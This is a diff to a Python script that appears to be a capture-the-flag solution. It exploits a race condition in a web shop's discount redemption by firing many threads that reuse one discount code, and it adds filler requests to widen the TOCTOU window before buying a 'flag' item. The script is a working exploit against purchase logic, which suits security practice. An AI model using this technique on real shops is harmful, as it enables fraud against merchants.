@@ -27,24 +27,18 @@ def register(session, username, password):
     return r.text.split("Code: ")[1].split("</div>")[0]
 
 def use_code(session, code):
-    try:
-        session.post(base_url + "apply_discount", data={"discount": code})
-    except:
-        pass
-
+    session.post(base_url + "apply_discount", data={"discount": code})
 
 def add_to_cart(session, item_id):
-    try:
-        r = session.get(base_url + "add_to_cart?item_id=" + str(item_id), timeout = 0.00001)
-    except:
-        pass
+    r = session.get(base_url + "add_to_cart?item_id=" + str(item_id))
 
-def pay_and_check(session, username, password):
+def pay_and_check(session):
     session.get(base_url + "cart/pay")
     items = session.get(base_url + "items").text
     if "flag" in items:
         print('flag{' + items.split("flag{")[1].split("}")[0] + '}')
-        print('Found flag with user: ' + username + ' and password: ' + password)
+    else:
+        print('No flag :( let\'s try again')
 
 def fake_user():
     username = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
@@ -60,19 +54,22 @@ while True:
 
     code = register(s, username, password)
 
-    add_to_cart(s, to_buy)
-    # We run in parallel multiple threads to use the discount code
-    n = find_n(10000) # Number of threads to spawn
+    n = find_n(10000) # Number of times we need to use the discount code to get the flag
+
+    add_to_cart(s, to_buy) # Add the flag to the cart
 
     threads = []
-
-    for i in range(n):
+    for i in range(100): # Why this? To make the server busy and make the TOCTOU more likely
+        threads.append(threading.Thread(target=add_to_cart, args=(s, i)))
+    for _ in range(n):
         threads.append(threading.Thread(target=use_code, args=(s, code)))
 
     for t in threads:
         t.start()
 
+    for t in threads:
+        t.join()
 
-    pay_and_check(s, username, password)
+    pay_and_check(s)
 
-    time.sleep(0.1)
+    time.sleep(0.2)
